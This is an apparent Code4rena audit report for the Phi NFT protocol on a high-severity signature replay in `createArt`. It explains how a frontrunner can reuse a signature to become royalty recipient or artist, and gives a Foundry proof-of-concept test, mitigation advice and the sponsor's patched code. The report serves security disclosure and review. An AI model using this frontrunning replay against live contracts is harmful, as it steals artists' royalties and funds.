---
tags:
  - lang/solidity
  - sector/nft
  - sector/nft-marketplace
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - impact/mev/frontrun
protocol: "[[Phi]]"
auditors:
  - "[[petarP1998]]"
report: "https://code4rena.com/reports/2024-08-phi"
genome:
  - "[[signature-replay]]"
  - "[[direct-drain]]"
  - "[[frontrun]]"
  - "[[frontrun-exposure]]"
  - "[[permit-fork-replay]]"
  - "[[reentrancy-guard]]"
  - "[[royalty-edge-cases]]"
  - "[[timestamp-dependence]]"
---
# [H-02] Signature replay in `createArt` allows to impersonate artist and steal royalties

- id: 41088
- impact: HIGH
- protocol: [[Phi]]
- reporter: petarP1998 (Code4rena)
- source: https://code4rena.com/reports/2024-08-phi

## Summary


The report discusses a bug in the `createArt` function of the PhiFactory smart contract. This bug allows anyone to manipulate the transaction by reusing the original signature and supplying their own configuration, which can lead to the theft of funds from the artist and other negative impacts. The report provides a proof of concept and recommends mitigation steps to fix the bug. The assessed type of the bug is "Invalid Validation" and it is classified as "High" severity.

## Details


Loss of funds as anyone can frontrun the `createArt` transaction, reusing the original signature but supplying their own config. As a result, the artist, the royalties recipient, as well the the royalty BPS can be set arbitrarily, leading to stealing the royalties from the artist and achieving other impacts.

### Summary

Function [`PhiFactory::createArt()`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L196-L213) doesn't limit the signature to either the specific submitter, nor does it include into the signed data the `CreateConfig` parameters; which in particular include the `artist`, the royalties `receiver`, as well as other parameters. Other impacts are possible but here is one specific scenario:

1. The legitimate party creates a valid signature, config, and submits the `createArt` transaction.
2. An attacker observes `createArt` transaction in the mempool, and frontruns it, reusing the signature, but with their own config where they are the royalties recipient.
3. Attacker's transaction succeeds, setting them as the royalties recipient.
4. The original transaction gets executed, and also succeeds, because [createERC1155Internal](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L551-L568) succeeds both when a new `PhiNFT1155` contract is created, as well as when it exists already.
5. The legitimate user doesn't notice the difference: both `ArtContractCreated` and `NewArtCreated` events are emitted correctly (only `NewArtCreated` is emitted twice).

As a result, the attacker gets all rewards sent to the `PhiRewards` contract from `PhiNFT1155` when the legitimate party claims an NFT token (see [`PhiNFT1155::claimFromFactory()`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/art/PhiNFT1155.sol#L164-L190)).

Other possible impacts (a non-exclusive list):

- The attacker sets themselves as an `artist`, and gets the possibility to call the [`PhiNFT1155::updateRoyalties()`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/art/PhiNFT1155.sol#L195C14-L203) function, thus setting the `royaltyBPS` to arbitrary value.
- The attacker sets themselves as an `artist`, and gets the possibility to call the [`PhiFactory::updateArtSettings()`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L215-L227) function, thus setting the parameters to arbitrary values, e.g. `maxSupply`, `endTime`, or `mintFee`.

### Proof of Concept

Drop this test to [PhiFactory.t.sol](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/test/PhiFactory.t.sol#L246) and execute via `forge test --match-test Kuprum`:

```solidity
function testKuprum_ImpersonateArtist() public {
    // The owner prepares the signature, the config,
    //  and submits the `createArt` transaction
    string memory artIdURL = "sample-art-id";
    bytes memory credData = abi.encode(1, owner, "SIGNATURE", 31_337, bytes32(0));
    bytes memory signCreateData = abi.encode(expiresIn, artIdURL, credData);
    bytes32 createMsgHash = keccak256(signCreateData);
    bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
    (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
    if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
    IPhiFactory.CreateConfig memory config =
        IPhiFactory.CreateConfig(artCreator, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
    
    // user1 observes `createArt` transaction in the mempool, and frontruns it,
    // reusing the signature, but with their own config where user1 is the receiver
    vm.deal(user1, 1 ether);
    vm.startPrank(user1);
    IPhiFactory.CreateConfig memory user1Config =
        IPhiFactory.CreateConfig(artCreator, user1, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
    phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), user1Config);

    // Owner's `createArt` succeeds; there is also no difference in the `ArtContractCreated` event
    vm.startPrank(owner);
    phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config);

    // Verify that user1 is now the royalties recipient
    uint256 artIdNum = 1;
    IPhiFactory.ArtData memory updatedArt = phiFactory.artData(artIdNum);
    assertEq(updatedArt.receiver, user1, "user1 should be the royalties recipient");
}
```

### Tools Used

Foundry

### Recommended Mitigation Steps

We recommend the following steps:

- In [`PhiFactory::createArt()`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L196-L213):
    - Include into the signed data the `CreateConfig` parameters.
    - Limit transaction execution to a specific submitter.
- In [`PhiFactory::createERC1155Internal()`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L551-L568) fail the transaction if the contract already exists.

### Assessed type

Invalid Validation

**[ZaK3939 (Phi) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-08-phi-findings/issues/70#issuecomment-2334655098):**
 > We will disregard the proposed mitigation, because it's incorrect. Instead, we will extend the signature by introducing nonce, creator, and executor. However, I believe this issue should be classified as Medium rather than High. Addresses that appear to be invalid artist addresses are easily verifiable on the frontend (for example, by checking for lack of prior history). Additionally, artists have certification badges through EAS (Ethereum Attestation Service).
 >
> So, we don't necessarily see a problem with multiple arts being created, but let me improve our logic by this:
> 
> 
> ```
> struct SignatureData {
>     uint256 expiresIn;
>     uint256 nonce;
>     address creator;
>     address executor;
>     string uri;
>     bytes credData;
> }
> 
> function createArt(
>     bytes calldata signedData_,
>     bytes calldata signature_,
>     CreateConfig memory createConfig_
> )
>     external
>     payable
>     nonReentrant
>     whenNotPaused
>     returns (address)
> {
>     _validateArtCreationSignature(signedData_, signature_);
>     
>     SignatureData memory data = abi.decode(signedData_, (SignatureData));
>     
>     ERC1155Data memory erc1155Data = _createERC1155Data(artIdCounter, createConfig_, data.uri, data.credData);
>     address artAddress = createERC1155Internal(artIdCounter, erc1155Data);
>     
>     nonces[_msgSender()]++;
>     artIdCounter++;
>     return artAddress;
> }
> 
> function _validateArtCreationSignature(bytes memory signedData_, bytes calldata signature_) private view {
>     SignatureData memory data = abi.decode(signedData_, (SignatureData));
>     if (_recoverSigner(keccak256(signedData_), signature_) != phiSignerAddress) revert AddressNotSigned();
>     if (data.expiresIn <= block.timestamp) revert SignatureExpired();
>     if (data.creator != address(0) && data.creator != _msgSender()) revert InvalidCreator();
>     if (data.executor != address(0) && data.executor != _msgSender()) revert InvalidExecutor();
>     if (data.nonce != nonces[_msgSender()]) revert InvalidNonce();
> }
> ```

**[0xDjango (judge) commented](https://github.com/code-423n4/2024-08-phi-findings/issues/70#issuecomment-2347207571):**
 > High. This vulnerability would undermine the entire art creation process.

***
